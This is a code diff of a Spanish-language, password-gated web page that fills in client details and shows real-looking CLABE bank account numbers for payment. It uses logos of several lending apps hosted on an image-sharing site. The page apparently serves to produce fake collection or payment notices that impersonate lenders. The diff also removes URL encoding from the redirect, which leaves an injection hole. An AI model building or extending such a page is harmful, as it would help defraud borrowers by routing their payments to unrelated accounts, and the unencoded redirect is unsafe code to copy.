@@ -78,10 +78,8 @@
             <div class="space-y-5">
                 <input type="text" id="user" placeholder="Usuario" class="w-full px-6 py-4 rounded-2xl border border-slate-200 bg-white/50 outline-none focus:border-blue-500 transition-all font-medium">
                 <input type="password" id="pass" placeholder="Contraseña" class="w-full px-6 py-4 rounded-2xl border border-slate-200 bg-white/50 outline-none focus:border-blue-500 transition-all font-medium">
-                
                 <div id="login-error" class="error-msg text-center">Usuario o contraseña incorrectos</div>
-                
-                <button onclick="acceder()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-5 rounded-2xl shadow-xl active:scale-95 transition-all mt-4 uppercase tracking-widest text-sm">
+                <button onclick="acceder()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-5 rounded-2xl shadow-xl transition-all mt-4 uppercase tracking-widest text-sm">
                     Entrar al Sistema
                 </button>
             </div>
@@ -131,16 +129,16 @@
 
             <div class="bg-slate-50 rounded-[2rem] p-5 space-y-4 border border-slate-100">
                 <div class="text-center">
-                    <span class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Método de pago<span class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Método de pago</span>
-    <select id="metodo-pago" class="w-full bg-white border border-slate-200 rounded-xl py-2.5 text-sm font-bold text-center outline-none">
-        <option value="MERCADO PAGO W SPEI">MERCADO PAGO W SPEI</option>
-        <option value="BBVA">BBVA</option>
-    </select>
+                    <span class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Método de pago</span>
+                    <select id="metodo-pago" onchange="cambiarCuenta()" class="w-full bg-white border border-slate-200 rounded-xl py-2.5 text-sm font-bold text-center outline-none">
+                        <option value="MERCADO PAGO W SPEI">MERCADO PAGO W SPEI</option>
+                        <option value="BBVA">BBVA</option>
+                    </select>
                 </div>
                 <div class="text-center">
                     <span class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Liga de pago</span>
-                    <select class="w-full bg-white border border-slate-200 rounded-xl py-2.5 text-sm font-bold text-center text-blue-600 outline-none">
-                        <option value="703010052250010635">703010052250010635</option>
+                    <select id="clabe-pago" class="w-full bg-white border border-slate-200 rounded-xl py-2.5 text-sm font-bold text-center text-blue-600 outline-none">
+                        <option value="722969010005687921">722969010005687921</option>
                     </select>
                 </div>
             </div>
@@ -161,7 +159,6 @@
     </div>
 
     <script>
-        // LOGIN CORREGIDO - INDEPENDIENTE
         function acceder() {
             const u = document.getElementById('user').value;
             const p = document.getElementById('pass').value;
@@ -174,6 +171,17 @@
                 document.getElementById('login-error').style.display = 'block';
                 setTimeout(() => { document.getElementById('login-error').style.display = 'none'; }, 2000);
             }
+        }
+
+        // FUNCIÓN PARA CAMBIAR CLABES
+        function cambiarCuenta() {
+            const metodo = document.getElementById('metodo-pago').value;
+            const clabeSelect = document.getElementById('clabe-pago');
+            clabeSelect.innerHTML = "";
+            let nuevaClabe = (metodo === "MERCADO PAGO W SPEI") ? "722969010005687921" : "012 180 01509457991 6";
+            const option = document.createElement("option");
+            option.value = nuevaClabe; option.text = nuevaClabe;
+            clabeSelect.add(option);
         }
 
         const logos = {'tala': 'https://i.ibb.co/qF6Vvqy/tala-te-presta.png','nu': 'https://i.ibb.co/Lzf7vYn/image-45ecfc.png','dida': 'https://i.ibb.co/BccC9Rz/image-46429b.png','worldmox': 'https://i.ibb.co/VvzM47m/image-45e8a1.png','movil': 'https://i.ibb.co/vY8N9zX/image-45e4a2.png'};
@@ -198,10 +206,8 @@
             let venc = new Date(f + 'T00:00:00');
             let diffDays = Math.ceil((venc.getTime() - hoy.getTime()) / (1000 * 60 * 60 * 24));
             const d = document.getElementById('res-dias');
-            if(d) {
-                d.innerText = diffDays;
-                d.style.color = diffDays < 0 ? "#ef4444" : "#1e293b";
-            }
+            d.innerText = diffDays;
+            d.style.color = diffDays < 0 ? "#ef4444" : "#1e293b";
         }
 
         function confirmar() {
@@ -209,15 +215,13 @@
             const nombre = document.getElementById('cliente-nombre').value || "Cliente";
             const tel = document.getElementById('cliente-tel').value || "";
             const fecha = document.getElementById('f-venc').value || "";
+            const clabe = document.getElementById('clabe-pago').value;
             const sel = document.getElementById('product-select');
             const producto = sel.options[sel.selectedIndex].text;
 
-            const url = `detalle.html?monto=${encodeURIComponent(monto)}&nombre=${encodeURIComponent(nombre)}&tel=${encodeURIComponent(tel)}&fecha=${encodeURIComponent(fecha)}&prod=${encodeURIComponent(producto)}`;
-            window.location.href = url;
+            window.location.href = `detalle.html?monto=${monto}&nombre=${nombre}&tel=${tel}&fecha=${fecha}&prod=${producto}&clabe=${clabe}`;
         }
-
         document.getElementById('f-venc').value = new Date().toISOString().split('T')[0];
     </script>
 </body>
 </html>
-
